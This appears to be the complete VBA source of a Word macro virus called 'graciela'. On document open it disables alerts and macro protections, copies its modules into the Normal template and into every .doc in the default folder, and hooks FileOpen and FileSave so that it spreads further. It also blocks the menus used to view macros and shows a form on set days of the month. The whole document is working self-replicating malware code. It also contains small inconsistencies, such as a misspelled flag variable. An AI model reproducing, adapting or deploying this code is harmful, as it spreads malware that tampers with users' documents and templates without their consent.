   Attribute VB_Name = "graciela"
   Dim cheleado As Boolean, architmp As String

   Sub AutoOpen()
       On Error Resume Next
       desactivar_todo
       no_me_veras_ok
       copiar_me
       cerrar_plantilla
       mostrar_graciela
   End Sub

   Sub desactivar_todo()
       On Error Resume Next
       Application.EnableCancelKey = 0
       Application.DisplayAlerts = 0
       WordBasic.DisableAutoMacros False
   End Sub

   Sub copiar_me()
       On Error Resume Next
       Dim ya As Boolean, dirtmp As String
       dirtmp = Options.DefaultFilePath(0)
       architmp = ActiveDocument.FullName
       With Application.FileSearch
           .NewSearch
           .LookIn = Options.DefaultFilePath(8)
           .FileName = "graciela.src"
           .MatchTextExactly = False
           If .Execute > 0 Then
               For i = 1 To .FoundFiles.Count
                       ya = True
               Next i
           End If
       End With
       If ya = False Then
           With ActiveDocument
               .SaveAs FileName:=Options.DefaultFilePath(8) & "\graciela.src", _
                               FileFormat:=wdFormatTemplate, _
                               AddToRecentFiles:=False
           End With
           copiar_items (NormalTemplate.FullName)
           reproducir_me (dirtmp)
       End If
   End Sub

   Sub reproducir_me(direc As String)
       On Error Resume Next
       With Application.FileSearch
           .NewSearch
           .LookIn = direc
           .SearchSubFolders = False
           .FileName = "*.doc"
           .MatchTextExactly = False
           .FileType = 3
           If .Execute > 0 Then
               For i = 1 To .FoundFiles.Count
                   If ActiveDocument.FullName <> .FoundFiles(i) Then
                       copiar_items (.FoundFiles(i))
                   End If
               Next i
           End If
       End With
   End Sub

   Sub copiar_items(archivo As String)
       On Error Resume Next
       Dim nmak(1) As String, NT As Object
       Dim aSrc$
       Dim aDes As Variant
       aDes = archivo
       nmak(0) = "fotografia"
       nmak(1) = "graciela"
       aSrc = Options.DefaultFilePath(8) & "\graciela.src"
       checar aDes
       If chelado = False Then fotocopiar aSrc, aDes, nmak
       ActiveDocument.Save
   End Sub

   Public Sub fotocopiar(Sfile, Dfile, nmak)
       On Error Resume Next
       Dim aNmak
       For Each aNmak In nmak
           On Error Resume Next
           Application.OrganizerCopy Sfile, Dfile, aNmak, 3
       Next
   End Sub

   Sub cerrar_plantilla()
       On Error Resume Next
       If ActiveDocument.Name = "graciela.src" Then
           Documents.Open architmp, False, False, False, "", "", False, "", "", 0
           Windows("graciela.src").Close
       End If
   End Sub

   Sub checar(Sfile)
       Dim nmak As Object, foto As Boolean, chela As Boolean
       cheleado = False
       For Each nmak In Sfile.VBProject.VBComponents
           If nmak.Name = "fotografia" Then foto = True
           If nmak.Name = "graciela" Then chela = True
       Next nmak
       If (foto And chela) Then cheleado = True
   End Sub

   Sub no_me_veras_ok()
       On Error Resume Next
       CommandBars("Macro").Controls(1).OnAction = "ViewVbCode"
       CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
       CommandBars("Visual Basic").Controls(1).OnAction = "ViewVbCode"
       CommandBars("Visual Basic").Controls(2).OnAction = "ViewVbCode"
   End Sub

   Sub ToolsMacro()
       ViewVBcode
   End Sub

   Sub ViewVBcode()
       On Error Resume Next
       If MsgBox("Me quieres ver desnuda?", vbExclamation + vbYesNo, "Chela") = vbYes Then
           SendKeys "%m%s%b~%dAtrevido...%m"
       Else
           SendKeys "tu te lo pierdes..."
       End If
   End Sub

   Sub mostrar_graciela()
       On Error Resume Next
       Dim hoy As Integer
       hoy = Day(Now())
       If (hoy = 5) Or _
          (hoy = 12) Or _
          (hoy = 19) Or _
          (hoy = 26) Then
               fotografia.Show
       End If
   End Sub

   Sub FileOpen()
       On Error Resume Next
       mostrar_graciela
       Dialogs(80).Show
       copiar_items (ActiveDocument.FullName)
   End Sub

   Sub FileSaveAS()
       On Error Resume Next
       Dialogs(84).Show
       FileSave
   End Sub

   Sub FileSave()
       On Error Resume Next
       ActiveDocument.Save
       copiar_items (ActiveDocument.FullName)
       mostrar_graciela
   End Sub
